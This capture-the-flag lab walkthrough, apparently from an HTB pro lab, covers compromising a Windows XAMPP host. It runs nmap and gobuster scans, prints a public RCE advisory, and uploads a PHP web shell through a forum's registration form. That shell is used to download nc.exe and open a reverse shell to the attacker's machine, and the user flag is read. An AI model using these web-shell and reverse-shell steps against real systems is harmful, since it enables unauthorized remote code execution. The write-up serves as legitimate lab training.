# Reconnaissances
## 172.16.1.13
```
$ proxychains nmap 172.16.1.13 -p80,443,445 -sT -sV -A -Pn -vvvv
```
```
Nmap scan report for 172.16.1.13
Host is up, received user-set (0.20s latency).
Scanned at 2024-03-02 23:47:17 EST for 82s

PORT    STATE SERVICE       REASON  VERSION
80/tcp  open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.13/dashboard/
443/tcp open  ssl/http      syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.13/dashboard/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
445/tcp open  microsoft-ds? syn-ack

Host script results:
|_clock-skew: 54m24s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19472/tcp): CLEAN (Couldn't establish connection (Nsock connect failed immediately))
|   Check 2 (port 22263/tcp): CLEAN (Couldn't establish connection (Nsock connect failed immediately))
|   Check 3 (port 4179/udp): CLEAN (Timeout)
|   Check 4 (port 49630/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-03-03T05:42:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:48
Completed NSE at 23:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:48
Completed NSE at 23:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:48
Completed NSE at 23:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.11 seconds
```

### Observe the SMB
```
$ proxychains smbclient -L \\172.16.1.13
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

### Observe the HTTP
```
$ proxychains firefox http://172.16.1.13/
$ proxychains firefox http://172.16.1.13/dashboard/phpinfo.php
```

Dirbuster
```
$ gobuster dir --proxy socks5://127.0.0.1:1080 --url http://172.16.1.13/ -w /usr/share/wordlists/dirb/common.txt
```
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 1043]
/.hta                 (Status: 403) [Size: 1043]
/.htpasswd            (Status: 403) [Size: 1043]
/aux                  (Status: 403) [Size: 1043]
/cgi-bin/             (Status: 403) [Size: 1057]
/com1                 (Status: 403) [Size: 1043]
/com2                 (Status: 403) [Size: 1043]
/com3                 (Status: 403) [Size: 1043]
/con                  (Status: 403) [Size: 1043]
/dashboard            (Status: 301) [Size: 338] [--> http://172.16.1.13/dashboard/]
/discuss              (Status: 301) [Size: 336] [--> http://172.16.1.13/discuss/]
/favicon.ico          (Status: 200) [Size: 30894]
/examples             (Status: 503) [Size: 1057]
/img                  (Status: 301) [Size: 332] [--> http://172.16.1.13/img/]
/index.php            (Status: 302) [Size: 0] [--> http://172.16.1.13/dashboard/]
/licenses             (Status: 403) [Size: 1202]
/lpt1                 (Status: 403) [Size: 1043]
/lpt2                 (Status: 403) [Size: 1043]
/nul                  (Status: 403) [Size: 1043]
/phpmyadmin           (Status: 403) [Size: 1202]
/prn                  (Status: 403) [Size: 1043]
/server-info          (Status: 403) [Size: 1202]
/server-status        (Status: 403) [Size: 1202]
/webalizer            (Status: 403) [Size: 1043]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================                                                                  
```

Looking for /discuss
```
proxychains firefox http://172.16.1.13/discuss/
```
```
Technical Discussion Forum(TDS)
```

Search exploit for "Discussion Forum"
```
$ searchsploit "Discussion Forum" 
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Alienvault Open Source SIEM (OSSIM) 4.6.1 - (Authenticated) SQL Injection (Metasploit)                                                    | php/webapps/33317.txt
Alienvault OSSIM/USM 5.3.1 - Persistent Cross-Site Scripting                                                                              | php/webapps/40683.txt
Alienvault OSSIM/USM 5.3.1 - PHP Object Injection                                                                                         | php/webapps/40682.txt
Alienvault OSSIM/USM 5.3.1 - SQL Injection                                                                                                | php/webapps/40684.txt
ASP-DEV Discussion Forum 2.0 - Admin Directory Weak Default Permissions                                                                   | asp/webapps/22895.txt
Creative Software UK Community Portal 1.1 - 'Discussions.php?forum_id' SQL Injection                                                      | php/webapps/27833.txt
Discussion Forums 2k 3.3 - Multiple SQL Injections                                                                                        | php/webapps/6643.txt
freediscussionforums 1.0 - Multiple Vulnerabilities                                                                                       | asp/webapps/14999.txt
Message Board / Threaded Discussion Forum - 'Sign_In.aspx' SQL Injection                                                                  | asp/webapps/30426.txt
Online Discussion Forum Site 1.0 - Remote Code Execution                                                                                  | php/webapps/48512.txt
Online Discussion Forum Site 1.0 - XSS in Messaging System                                                                                | php/webapps/48897.txt
oracle Application server discussion forum portlet - Multiple Vulnerabilities                                                             | jsp/webapps/26972.txt
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results                             
```
```
$ cat /usr/share/exploitdb/exploits/php/webapps/48512.txt   
# Exploit Title: Online Discussion Forum Site 1.0 - Remote Code Execution
# Google Dork: N/A
# Date: 2020-05-24
# Exploit Author: Selim Enes 'Enesdex' Karaduman
# Vendor Homepage: https://www.sourcecodester.com/php/14233/online-discussion-forum-site.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14233&title=Online+Discussion+Forum+Site
# Version: 1.0 (REQUIRED)
# Tested on: Windows 10 / Wamp Server
# CVE : N/A
Go to http://localhost/Online%20Discussion%20Forum%20Site/register.php register page to sign up
Then fill other fields and upload the shell.php with following PHP-shell-code

<?php
$command = shell_exec($_REQUEST['cmd']);
echo $command;
?>

After the registration process is completed go to the following page and execute the os command via uploaded shell
http://localhost/Online%20Discussion%20Forum%20Site/ups/shell.php?cmd=$THECODE-YOU-WANT-TO-EXECUTE

Any unauthenticated attacker is able to execute arbitrary os command    
```

The registration form has the option to upload an image. Save the below code to shell.php and upload it using the form.

	vi shell.php

```php
<?php echo exec($_GET["cmd"]);?>
```

Then upload it on:
```
$ proxychains firefox http://172.16.1.13/discuss/register.php
```

After submit the `shell.php`
```
$ proxychains curl http://172.16.1.13/discuss/ups/shell.php?cmd=whoami
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:80  ...  OK
dante-ws01\gerald    
```

### Add an Interactive Shell
Upload `nc.exe` from local Kali to the target host with HTTP port
```
$ cp /usr/share/windows-resources/binaries/nc.exe .

┌──(kali㉿kali)-[~/…/PlayGround/HTB/ProLab/dante]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
$ proxychains firefox "http://172.16.1.13/discuss/ups/shell.php?cmd=powershell wget 10.10.14.2/nc.exe -o nc.exe"
```

Reverse shell
```
$ nc -lvnp 9001
```
```
$ proxychains firefox "http://172.16.1.13/discuss/ups/shell.php?cmd=nc.exe -e cmd.exe 10.10.14.2 9001"
```
```
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.110.3] 5187
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\discuss\ups>hostname
hostname
DANTE-WS01

C:\xampp\htdocs\discuss\ups>type C:\Users\gerald\Desktop\flag.txt
type C:\Users\gerald\Desktop\flag.txt
DANTE{l355_t4lk_m04r_l15tening}
C:\xampp\htdocs\discuss\ups>

```